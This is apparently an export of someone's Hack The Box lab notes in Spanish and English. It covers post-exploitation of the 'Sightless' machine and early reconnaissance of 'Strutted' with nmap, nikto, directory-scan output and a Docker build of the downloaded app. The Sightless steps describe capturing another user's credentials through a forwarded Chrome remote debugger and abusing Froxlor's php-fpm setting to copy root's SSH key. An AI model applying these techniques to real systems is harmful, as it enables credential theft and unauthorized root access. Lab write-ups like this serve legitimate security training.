<a data-tooltip-position="top" aria-label="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/" rel="noopener nofollow" class="external-link" href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/" target="_blank">Info</a><br>
<img alt="Pasted image 20241120132610.png" src="machines/sightless/sightless-images/pasted-image-20241120132610.png"><br>ssh -L 42253:127.0.0.1:42253 michael@sightless.htb
<br><img alt="Pasted image 20241120132745.png" src="machines/sightless/sightless-images/pasted-image-20241120132745.png"><br><img alt="Pasted image 20241120132829.png" src="machines/sightless/sightless-images/pasted-image-20241120132829.png"><br><img alt="Pasted image 20241119202313.png" src="machines/sightless/sightless-images/pasted-image-20241119202313.png"><br><img alt="Pasted image 20241120132929.png" src="machines/sightless/sightless-images/pasted-image-20241120132929.png"><br>
In this new window, switch to the “Network” tab and wait for Michael to log in. Monitor the traffic and locate index.php to find the credentials required to access the login portal on 127.0.0.1:8080. Use these credentials to log in.<br><img alt="Pasted image 20241120133655.png" src="machines/sightless/sightless-images/pasted-image-20241120133655.png"><br>Entramos en el admin panel :<br>
<img alt="Pasted image 20241120134204.png" src="machines/sightless/sightless-images/pasted-image-20241120134204.png"><br>Nos dirigimos a php&gt;php-fpm-versions y le damos a + create a new php version<br>
<img alt="Pasted image 20241120134313.png" src="machines/sightless/sightless-images/pasted-image-20241120134313.png"><br><img alt="Pasted image 20241120134541.png" src="machines/sightless/sightless-images/pasted-image-20241120134541.png"><br>
Una vez en el panel copiamos el id rsa a una carpeta a la que podamos acceder y le damos permisos de lectura y escritura<br>
<img alt="Pasted image 20241120134755.png" src="machines/sightless/sightless-images/pasted-image-20241120134755.png"><br>Una vez ya preparados los RCE tenemos que reiniciar el servicio, en la API lo podremos hacer desde settings&gt;&gt;PHP-FP<br>
<img alt="Pasted image 20241120135012.png" src="machines/sightless/sightless-images/pasted-image-20241120135012.png"><br><img alt="Pasted image 20241120135704.png" src="machines/sightless/sightless-images/pasted-image-20241120135704.png"><br><br><img alt="Pasted image 20241120135848.png" src="machines/sightless/sightless-images/pasted-image-20241120135848.png"><br><br>
<br>netstat -tlnp
<br>/etc/hosts
<br><br>
<br>Chrome Remote Debugger
<br>php-fpm (Froxlor)
<br>]]></description><link>machines/sightless/03-post-exploitation.html</link><guid isPermaLink="false">Machines/Sightless/03-post-exploitation.md</guid><pubDate>Wed, 20 Nov 2024 13:11:10 GMT</pubDate><enclosure url="machines/sightless/sightless-images/pasted-image-20241119200213.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/sightless/sightless-images/pasted-image-20241119200213.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Sightless]]></title><description><![CDATA[<a class="tag" href="?query=tag:machine" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#machine</a> <a class="tag" href="?query=tag:Injections" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#Injections</a> <a class="tag" href="?query=tag:OS_Command_Injection" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#OS_Command_Injection</a> <a class="tag" href="?query=tag:Vulnerability_Assessment" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#Vulnerability_Assessment</a> <a class="tag" href="?query=tag:Cross_Site_Scripting_" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#Cross_Site_Scripting_</a> <a class="tag" href="?query=tag:Port_Forwarding" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#Port_Forwarding</a> <a class="tag" href="?query=tag:Authentication_bypass" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#Authentication_bypass</a> <a class="tag" href="?query=tag:SSH" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#SSH</a> <a class="tag" href="?query=tag:JavaScript" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#JavaScript</a> <a class="tag" href="?query=tag:NGINX" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#NGINX</a> <a class="tag" href="?query=tag:Docker" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#Docker</a> <a class="tag" href="?query=tag:Web_Application" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#Web_Application</a> <a class="tag" href="?query=tag:Password_Cracking" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#Password_Cracking</a> <a class="tag" href="?query=tag:NodeJS" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#NodeJS</a> <a class="tag" href="?query=tag:Bash" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#Bash</a> <a class="tag" href="?query=tag:Remote_Code_Execution" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#Remote_Code_Execution</a> <a class="tag" href="?query=tag:Databases" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#Databases</a> <a class="tag" href="?query=tag:Cryptography" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#Cryptography</a> 
 <br><br><br> <img src="https://www.hackthebox.com//storage/avatars/f96160a20e9cf0138885238444b47404.png" referrerpolicy="no-referrer"> <br><a href=".?query=tag:machine" class="tag" target="_blank" rel="noopener nofollow">#machine</a><br><br><img src="lib/media/linux.png" style="max-width:70px" referrerpolicy="no-referrer"><br><br><br>
id:: 624
active:: True
name:: Sightless
os::Linux
user_flag:: True
root_flag:: True
difficulty_text:: Easy
stars:: 3.5
created:: 01/25/2025
published:: 09/07/24
avatar:: /storage/avatars/f96160a20e9cf0138885238444b47404.png
tags:: #Injections #OS_Command_Injection #Vulnerability_Assessment #Cross_Site_Scripting_(XSS) #Port_Forwarding #Authentication_bypass #SSH #JavaScript #NGINX #Docker #Web_Application #Password_Cracking #NodeJS #Bash #Remote_Code_Execution #Databases #Cryptography 
<br><br><br><br><br>Update this Machine info]]></description><link>machines/sightless/sightless.html</link><guid isPermaLink="false">Machines/Sightless/Sightless.md</guid><pubDate>Sat, 25 Jan 2025 18:07:26 GMT</pubDate><enclosure url="https://www.hackthebox.com//storage/avatars/f96160a20e9cf0138885238444b47404.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.hackthebox.com//storage/avatars/f96160a20e9cf0138885238444b47404.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Nmap]]></title><description><![CDATA[ 
 <br><br><br>sudo nmap -sS -Pn -v -n -p- --min-rate 5000 strutted.htb -oG grepable
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-18 18:56 CET
Initiating SYN Stealth Scan at 18:56
Scanning strutted.htb (10.10.11.59) [65535 ports]
Discovered open port 80/tcp on 10.10.11.59
Discovered open port 22/tcp on 10.10.11.59
Completed SYN Stealth Scan at 18:57, 13.47s elapsed (65535 total ports)
Nmap scan report for strutted.htb (10.10.11.59)
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
<br><br>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Strutted\xE2\x84\xA2 - Instant Image Uploads
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<br><br><br>nikto --url http://strutted.htb:80
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.59
+ Target Hostname:    strutted.htb
+ Target Port:        80
+ Start Time:         2025-02-18 18:59:52 (GMT1)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Uncommon header 'cross-origin-embedder-policy-report-only' found, with contents: require-corp.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .                                                          
+ /getaccess: This may be an indication that the server is running getAccess for SSO.                                
+ /siteminder: This may be an indication that the server is running Siteminder for SSO.                              
+ /tree: WASD Server reveals the entire web root structure and files via this URL. Upgrade to a later version and secure according to the documents on the WASD web site.
+ /submit?setoption=q&amp;option=allowed_ips&amp;value=255.255.255.255: MLdonkey 2.x allows administrative interface access to be access from any IP. This is typically only found on port 4080. See: OSVDB-3126
+ /doc: The /doc directory is browsable. This may be /usr/doc. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0678
+ /BACLIENT: IBM Tivoli default file found. See: OSVDB-2117
+ /server-status: This reveals Apache information. Comment out appropriate line in the Apache conf file or restrict access to allowed sources. See: OSVDB-561
+ /access-log: This might be interesting.
+ /access_log: This might be interesting.
+ /certificate: This might be interesting.
+ /certificates: This might be interesting.
+ /console: This might be interesting.
+ /error_log: This might be interesting.
+ /htpasswd: This might be interesting.
+ /js: This might be interesting.
+ /logfile: This might be interesting.
+ /mbox: This might be interesting.
+ /new: This might be interesting.
+ /news: This might be interesting.
+ /oracle: This might be interesting.
+ /passwd: This might be interesting.
+ /passwdfile: This might be interesting.
+ /password: This might be interesting.
+ /poll: This might be interesting.
+ /polls: This might be interesting.
+ /readme: This might be interesting.
+ /scratch: This might be interesting.
+ /spwd: This might be interesting.
+ /srchadm: This might be interesting.
+ /swf: This might be interesting: Flash files?.
+ /sam: This might be interesting.
+ /add_acl: This might be interesting: has been seen in web logs from an unknown scanner.
+ /dbabble: This might be interesting: has been seen in web logs from an unknown scanner.
+ /do_map: This might be interesting: has been seen in web logs from an unknown scanner.
+ /do_subscribe: This might be interesting: has been seen in web logs from an unknown scanner.
+ /netget?sid=Safety&amp;amp;msg=2002&amp;amp;file=Safety: This might be interesting: has been seen in web logs from an unkno
<br><br>200      GET      182l      443w     6119c http://strutted.htb/how
200      GET        0l        0w 39680602c http://strutted.htb/download
200      GET        0l        0w 39680602c http://strutted.htb/download.action
200      GET      182l      567w     6610c http://strutted.htb/about
404      GET        1l       67w      770c http://strutted.htb/text/css
404      GET        1l       67w      770c http://strutted.htb/text/
400      GET       12l      137w     2006c http://strutted.htb/%7D
400      GET        1l       72w      771c http://strutted.htb/[
400      GET        1l       72w      771c http://strutted.htb/plain]
400      GET        1l       72w      771c http://strutted.htb/]
200      GET        0l        0w     5197c http://strutted.htb/scoop
400      GET        1l       72w      771c http://strutted.htb/quote]
400      GET       12l      137w     2010c http://strutted.htb/a0%7D
400      GET        1l       72w      771c http://strutted.htb/extension]
200      GET        0l        0w     5197c http://strutted.htb/fia

<br>Main:<br>
<img alt="Pasted image 20250218190201.png" src="machines/strutted/imgs/pasted-image-20250218190201.png"><br>
"We provide a Docker image that showcases the Strutted™ environment. Click the Download link on the menu to explore our Docker image to see how our platform is configured, and use it as a base template for your own projects."<br><br><img alt="Pasted image 20250218190327.png" src="machines/strutted/imgs/pasted-image-20250218190327.png"><br>Subimos una imagen y nos printea la imagen por pantalla; tambien un link para compartirla:<br><img alt="Pasted image 20250218190630.png" src="machines/strutted/imgs/pasted-image-20250218190630.png"><br>Le doy al boton de copy pero no parece subirme la imagen; miro el codigo fuente:<br>
<img alt="Pasted image 20250218190740.png" src="machines/strutted/imgs/pasted-image-20250218190740.png"><br>
el codigo es el siguiente<br>function() {
  // Select the text field
  shareableLink.select();
  shareableLink.setSelectionRange(0, 99999);

  // Copy the text inside the text field
  navigator.clipboard.writeText(shareableLink.value)
    .then(() =&gt; {
      // Success feedback
      copyButton.textContent = 'Copied!';
      copyButton.classList.remove('btn-outline-secondary');
      copyButton.classList.add('btn-success');
      setTimeout(() =&gt; {
        copyButton.textContent = 'Copy Shareable Link';
        copyButton.classList.remove('btn-success');
        copyButton.classList.add('btn-outline-secondary');
      }, 2000);
    })
    .catch(err =&gt; {
      // Error feedback
      console.error('Failed to copy: ', err);
      copyButton.textContent = 'Error!';
      copyButton.classList.remove('btn-outline-secondary');
      copyButton.classList.add('btn-danger');
      setTimeout(() =&gt; {
        copyButton.textContent = 'Copy Shareable Link';
        copyButton.classList.remove('btn-danger');
        copyButton.classList.add('btn-outline-secondary');
      }, 2000);
    });
}
<br>Ejecuto por consola el botón;<br><img alt="Pasted image 20250218191249.png" src="machines/strutted/imgs/pasted-image-20250218191249.png"><br>
El error Uncaught TypeError: navigator.clipboard is undefined ocurre :<br>
<br>Contexto de seguridad : El acceso al portapapeles (navigator.clipboard) solo está permitido en contextos seguros (HTTPS). Si estás trabajando en un sitio que no utiliza HTTPS (por ejemplo, HTTP), el navegador bloqueará el acceso a navigator.clipboard.
<br>Políticas del navegador : Algunos navegadores restringen el uso de navigator.clipboard si no se activa desde una acción de usuario real (como un clic).
<br>Consola del navegador : Cuando intentas acceder a navigator.clipboard directamente desde la consola del navegador, el navegador podría interpretarlo como si no proviniera de una interacción de usuario, lo que también puede provocar este error.
<br>Parece que el boton esta inoperativo<br>en el endpoint<br>http://strutted.htb/download.action
<br>Nos descarga un comprimido .zip ; listo los archivos:<br>7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=es_ES.UTF-8 Threads:5 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 39680602 bytes (38 MiB)

Listing archive: strutted.zip

--
Path = strutted.zip
Type = zip
Physical Size = 39680602

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2025-01-07 06:59:33 .....          615          293  Dockerfile
2025-01-07 06:59:33 .....         4064         1731  README.md
2025-01-07 06:59:33 .....         1361          786  context.xml
2025-01-07 06:59:33 D....            0            0  strutted
2025-01-07 06:59:33 .....         3999         1013  strutted/pom.xml
2025-01-07 06:59:33 .....         5810         2222  strutted/mvnw.cmd
2025-01-07 06:59:33 .....         9113         3030  strutted/mvnw
2025-01-07 06:59:33 D....            0            0  strutted/src
2025-01-07 06:59:33 D....            0            0  strutted/src/main
2025-01-07 06:59:33 D....            0            0  strutted/src/main/webapp
2025-01-07 07:00:20 D....            0            0  strutted/src/main/webapp/WEB-INF
2025-01-07 07:01:18 .....         4303         1436  strutted/src/main/webapp/WEB-INF/error.jsp
2025-01-07 06:59:33 .....         1117          409  strutted/src/main/webapp/WEB-INF/web.xml
2025-01-07 07:01:35 .....         4285         1402  strutted/src/main/webapp/WEB-INF/showImage.jsp
2025-01-07 07:11:38 .....         5647         1778  strutted/src/main/webapp/WEB-INF/upload.jsp
2025-01-07 07:01:26 .....         6125         1853  strutted/src/main/webapp/WEB-INF/how.jsp
2025-01-07 07:01:10 .....         6616         2208  strutted/src/main/webapp/WEB-INF/about.jsp
2025-01-07 07:01:45 .....         7120         2059  strutted/src/main/webapp/WEB-INF/success.jsp
2025-01-07 06:59:33 D....            0            0  strutted/src/main/java
2025-01-07 06:59:33 D....            0            0  strutted/src/main/java/org
2025-01-07 06:59:33 D....            0            0  strutted/src/main/java/org/strutted
2025-01-07 07:00:44 D....            0            0  strutted/src/main/java/org/strutted/htb
2025-01-07 06:59:33 .....         6656         1823  strutted/src/main/java/org/strutted/htb/Upload.java
2025-01-07 06:59:33 .....         1832          503  strutted/src/main/java/org/strutted/htb/URLMapping.java
2025-01-07 06:59:33 .....          199          147  strutted/src/main/java/org/strutted/htb/AboutAction.java
2025-01-07 06:59:33 .....         1582          630  strutted/src/main/java/org/strutted/htb/DatabaseUtil.java
2025-01-07 06:59:33 .....          197          147  strutted/src/main/java/org/strutted/htb/HowAction.java
2025-01-07 06:59:33 .....         1146          443  strutted/src/main/java/org/strutted/htb/URLUtil.java
2025-01-07 06:59:33 D....            0            0  strutted/src/main/resources
2025-01-07 07:00:54 .....         2145          678  strutted/src/main/resources/struts.xml
2025-01-07 06:59:33 D....            0            0  strutted/target
2025-01-07 06:59:33 D....            0            0  strutted/target/generated-sources
2025-01-07 06:59:33 D....            0            0  strutted/target/generated-sources/annotations
2025-01-07 06:59:33 D....            0            0  strutted/target/strutted-1.0.0
2025-01-07 06:59:33 D....            0            0  strutted/target/strutted-1.0.0/META-INF
2025-01-07 06:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF
2025-01-07 06:59:33 .....          587          346  strutted/target/strutted-1.0.0/WEB-INF/error.jsp
2025-01-07 06:59:33 .....         1117          409  strutted/target/strutted-1.0.0/WEB-INF/web.xml
2025-01-07 06:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF/lib
2025-01-07 06:59:33 .....       794034       738335  strutted/target/strutted-1.0.0/WEB-INF/lib/javassist-3.29.0-GA.jar
2025-01-07 06:59:33 .....     14259880     14221392  strutted/target/strutted-1.0.0/WEB-INF/lib/sqlite-jdbc-3.47.1.0.jar
2025-01-07 06:59:33 .....       632267       573075  strutted/target/strutted-1.0.0/WEB-INF/lib/commons-lang3-3.13.0.jar
2025-01-07 06:59:33 .....       264823       253389  strutted/target/strutted-1.0.0/WEB-INF/lib/ognl-3.3.4.jar
2025-01-07 06:59:33 .....        95505        83833  strutted/target/strutted-1.0.0/WEB-INF/lib/javax.servlet-api-4.0.1.jar
2025-01-07 06:59:33 .....        74132        64158  strutted/target/strutted-1.0.0/WEB-INF/lib/commons-fileupload-1.5.jar
2025-01-07 06:59:33 .....       238400       215227  strutted/target/strutted-1.0.0/WEB-INF/lib/commons-text-1.10.0.jar
2025-01-07 06:59:33 .....       313296       282310  strutted/target/strutted-1.0.0/WEB-INF/lib/log4j-api-2.20.0.jar
2025-01-07 06:59:33 .....      1519233      1360308  strutted/target/strutted-1.0.0/WEB-INF/lib/struts2-core-6.3.0.1.jar
2025-01-07 06:59:33 .....      1736381      1559626  strutted/target/strutted-1.0.0/WEB-INF/lib/freemarker-2.3.32.jar
2025-01-07 06:59:33 .....       483954       437052  strutted/target/strutted-1.0.0/WEB-INF/lib/commons-io-2.13.0.jar
2025-01-07 06:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF/classes
2025-01-07 06:59:33 .....         2315          771  strutted/target/strutted-1.0.0/WEB-INF/classes/struts.xml
2025-01-07 06:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF/classes/org
2025-01-07 06:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted
2025-01-07 06:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb
2025-01-07 06:59:33 .....          454          290  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/AboutAction.class
2025-01-07 06:59:33 .....         3276         1589  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/URLMapping.class
2025-01-07 06:59:33 .....         1610          847  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/URLUtil.class
2025-01-07 06:59:33 .....         7344         3859  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/Upload.class
2025-01-07 06:59:33 .....         2899         1606  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/DatabaseUtil.class
2025-01-07 06:59:33 .....          448          291  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/HowAction.class
2025-01-07 06:59:33 .....         5651         1787  strutted/target/strutted-1.0.0/WEB-INF/upload.jsp
2025-01-07 06:59:33 .....         6125         1853  strutted/target/strutted-1.0.0/WEB-INF/how.jsp
2025-01-07 06:59:33 .....         6918         2254  strutted/target/strutted-1.0.0/WEB-INF/about.jsp
2025-01-07 06:59:33 .....         7120         2059  strutted/target/strutted-1.0.0/WEB-INF/success.jsp
2025-01-07 06:59:33 D....            0            0  strutted/target/classes
2025-01-07 06:59:33 .....         2315          771  strutted/target/classes/struts.xml
2025-01-07 06:59:33 D....            0            0  strutted/target/classes/org
2025-01-07 06:59:33 D....            0            0  strutted/target/classes/org/strutted
2025-01-07 06:59:33 D....            0            0  strutted/target/classes/org/strutted/htb
2025-01-07 06:59:33 .....          454          290  strutted/target/classes/org/strutted/htb/AboutAction.class
2025-01-07 06:59:33 .....         3276         1589  strutted/target/classes/org/strutted/htb/URLMapping.class
2025-01-07 06:59:33 .....         1610          847  strutted/target/classes/org/strutted/htb/URLUtil.class
2025-01-07 06:59:33 .....         7344         3859  strutted/target/classes/org/strutted/htb/Upload.class
2025-01-07 06:59:33 .....         2899         1606  strutted/target/classes/org/strutted/htb/DatabaseUtil.class
2025-01-07 06:59:33 .....          448          291  strutted/target/classes/org/strutted/htb/HowAction.class
2025-01-07 06:59:33 D....            0            0  strutted/target/maven-archiver
2025-01-07 06:59:33 .....           57           57  strutted/target/maven-archiver/pom.properties
2025-01-07 06:59:33 .....     19820601     19820617  strutted/target/strutted-1.0.0.war
2025-01-07 06:59:33 D....            0            0  strutted/target/maven-status
2025-01-07 06:59:33 D....            0            0  strutted/target/maven-status/maven-compiler-plugin
2025-01-07 06:59:33 D....            0            0  strutted/target/maven-status/maven-compiler-plugin/compile
2025-01-07 06:59:33 D....            0            0  strutted/target/maven-status/maven-compiler-plugin/compile/default-compile
2025-01-07 06:59:33 .....          199           83  strutted/target/maven-status/maven-compiler-plugin/compile/default-compile/createdFiles.lst
2025-01-07 06:59:33 .....          589          129  strutted/target/maven-status/maven-compiler-plugin/compile/default-compile/inputFiles.lst
2025-01-07 06:59:33 .....          222          138  tomcat-users.xml
------------------- ----- ------------ ------------  ------------------------
2025-01-07 07:11:38           40371715     39661534  56 files, 30 folders

<br>Parece un docker configurado con el setup de la propia pagina; voy a montar el docker para examinarlo mas a fondo;<br>zip docker build -t strutted:latest .
[+] Building 65.6s (18/18) FINISHED                                                                                                    docker:default
 =&gt; [internal] load build definition from Dockerfile                                                                                             0.1s
 =&gt; =&gt; transferring dockerfile: 654B                                                                                                             0.0s
 =&gt; [internal] load metadata for docker.io/library/tomcat:9.0                                                                                    1.8s
 =&gt; [internal] load metadata for docker.io/library/openjdk:17-jdk-alpine                                                                         1.9s
 =&gt; [internal] load .dockerignore                                                                                                                0.1s
 =&gt; =&gt; transferring context: 2B                                                                                                                  0.0s
 =&gt; [stage-0 1/5] FROM docker.io/library/openjdk:17-jdk-alpine@sha256:4b6abae565492dbe9e7a894137c966a7485154238902f2f25e9dbd9784383d81          12.6s
 =&gt; =&gt; resolve docker.io/library/openjdk:17-jdk-alpine@sha256:4b6abae565492dbe9e7a894137c966a7485154238902f2f25e9dbd9784383d81                   0.2s
 =&gt; =&gt; sha256:4b6abae565492dbe9e7a894137c966a7485154238902f2f25e9dbd9784383d81 319B / 319B                                                       0.0s
 =&gt; =&gt; sha256:a996cdcc040704ec6badaf5fecf1e144c096e00231a29188596c784bcf858d05 951B / 951B                                                       0.0s
 =&gt; =&gt; sha256:264c9bdce361556ba6e685e401662648358980c01151c3d977f0fdf77f7c26ab 3.48kB / 3.48kB                                                   0.0s
 =&gt; =&gt; sha256:5843afab387455b37944e709ee8c78d7520df80f8d01cf7f861aae63beeddb6b 2.81MB / 2.81MB                                                   0.6s
 =&gt; =&gt; sha256:53c9466125e464fed5626bde7b7a0f91aab09905f0a07e9ad4e930ae72e0fc63 928.44kB / 928.44kB                                               0.4s
 =&gt; =&gt; sha256:d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662 186.80MB / 186.80MB                                               6.7s
 =&gt; =&gt; extracting sha256:5843afab387455b37944e709ee8c78d7520df80f8d01cf7f861aae63beeddb6b                                                        0.1s
 =&gt; =&gt; extracting sha256:53c9466125e464fed5626bde7b7a0f91aab09905f0a07e9ad4e930ae72e0fc63                                                        0.1s
 =&gt; =&gt; extracting sha256:d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662                                                        2.8s
 =&gt; [internal] load build context                                                                                                                0.5s
 =&gt; =&gt; transferring context: 40.38MB                                                                                                             0.3s
 =&gt; [stage-1 1/7] FROM docker.io/library/tomcat:9.0@sha256:198d5da39249fba1ba899e34e40ea471bab4faf30cf9b3686db8a9098df18562                     35.2s
 =&gt; =&gt; resolve docker.io/library/tomcat:9.0@sha256:198d5da39249fba1ba899e34e40ea471bab4faf30cf9b3686db8a9098df18562                              0.3s
 =&gt; =&gt; sha256:b7797ab8ba0bdfb722ad632172c7ab4abed5f0a19cabbd53bd9eec03eaa5e32c 12.56kB / 12.56kB                                                 0.0s
 =&gt; =&gt; sha256:198d5da39249fba1ba899e34e40ea471bab4faf30cf9b3686db8a9098df18562 6.63kB / 6.63kB                                                   0.0s
 =&gt; =&gt; sha256:bf8a242c4f77e92e36e505b08ccb4089d42d05cbf863185b0bc0626c5a214e93 2.72kB / 2.72kB                                                   0.0s
 =&gt; =&gt; sha256:5a7813e071bfadf18aaa6ca8318be4824a9b6297b3240f2cc84c1db6f4113040 29.75MB / 29.75MB                                                 1.5s
 =&gt; =&gt; sha256:8dbbbc6af9dc7b3eec20b35797f66551a17f035a85f020fc99a0457dd268aae8 22.94MB / 22.94MB                                                 1.6s
 =&gt; =&gt; extracting sha256:5a7813e071bfadf18aaa6ca8318be4824a9b6297b3240f2cc84c1db6f4113040                                                        1.8s
 =&gt; =&gt; sha256:a10b6847b9f1913a9d34980e0354787e49b068cdbdd78c70bab054c6cfbd1660 157.59MB / 157.59MB                                              11.8s
 =&gt; =&gt; sha256:dcc1c5ea3c7d921e35f64dce04af1c8a2cd97954281eb6af66f6067f6c2c319b 158B / 158B                                                       2.0s
 =&gt; =&gt; sha256:91e6cc55403ad09f9aeca15ab95bf547ad0b78be2b665c486beef7161150987d 2.28kB / 2.28kB                                                   2.4s
 =&gt; =&gt; sha256:eb56afb50b158a892d0e32e567930b208efa36d10b72f06b747121890909026d 139B / 139B                                                       2.7s
 =&gt; =&gt; sha256:4f4fb700ef54461cfa02571ae0db9a0dc1e0cdb5577484a6d75e68dc38e8acc1 32B / 32B                                                         3.0s
 =&gt; =&gt; sha256:9bb5b124edf974ec5d68e65f11e2285e02c624c91ab61c4936364dcbd5a9de2a 28.71MB / 28.71MB                                                 4.1s
 =&gt; =&gt; extracting sha256:8dbbbc6af9dc7b3eec20b35797f66551a17f035a85f020fc99a0457dd268aae8                                                        1.6s
 =&gt; =&gt; extracting sha256:a10b6847b9f1913a9d34980e0354787e49b068cdbdd78c70bab054c6cfbd1660                                                        2.8s
 =&gt; =&gt; extracting sha256:dcc1c5ea3c7d921e35f64dce04af1c8a2cd97954281eb6af66f6067f6c2c319b                                                        0.0s
 =&gt; =&gt; extracting sha256:91e6cc55403ad09f9aeca15ab95bf547ad0b78be2b665c486beef7161150987d                                                        0.0s
 =&gt; =&gt; extracting sha256:eb56afb50b158a892d0e32e567930b208efa36d10b72f06b747121890909026d                                                        0.0s
 =&gt; =&gt; extracting sha256:4f4fb700ef54461cfa02571ae0db9a0dc1e0cdb5577484a6d75e68dc38e8acc1                                                        0.0s
 =&gt; =&gt; extracting sha256:9bb5b124edf974ec5d68e65f11e2285e02c624c91ab61c4936364dcbd5a9de2a                                                        0.8s 
 =&gt; [stage-0 2/5] RUN apk add --no-cache maven                                                                                                  20.8s 
 =&gt; [stage-0 3/5] COPY strutted /tmp/strutted                                                                                                    1.1s 
 =&gt; [stage-0 4/5] WORKDIR /tmp/strutted                                                                                                          0.6s 
 =&gt; [stage-0 5/5] RUN mvn clean package                                                                                                         25.7s 
 =&gt; [stage-1 2/7] RUN rm -rf /usr/local/tomcat/webapps/                                                                                          0.9s 
 =&gt; [stage-1 3/7] RUN mv /usr/local/tomcat/webapps.dist/ /usr/local/tomcat/webapps/                                                              1.1s 
 =&gt; [stage-1 4/7] RUN rm -rf /usr/local/tomcat/webapps/ROOT                                                                                      0.8s 
 =&gt; [stage-1 5/7] COPY --from=0 /tmp/strutted/target/strutted-1.0.0.war /usr/local/tomcat/webapps/ROOT.war                                       0.6s 
 =&gt; [stage-1 6/7] COPY ./tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml                                                                0.3s 
 =&gt; [stage-1 7/7] COPY ./context.xml /usr/local/tomcat/webapps/manager/META-INF/context.xml                                                      0.4s 
 =&gt; exporting to image                                                                                                                           0.7s 
 =&gt; =&gt; exporting layers                                                                                                                          0.6s 
 =&gt; =&gt; writing image sha256:bb85931a61a85610dc1bed3bc85ad5c0f2bb40181965c8deee6a7914915ae928                                                     0.0s 
                                                                                                                                                      
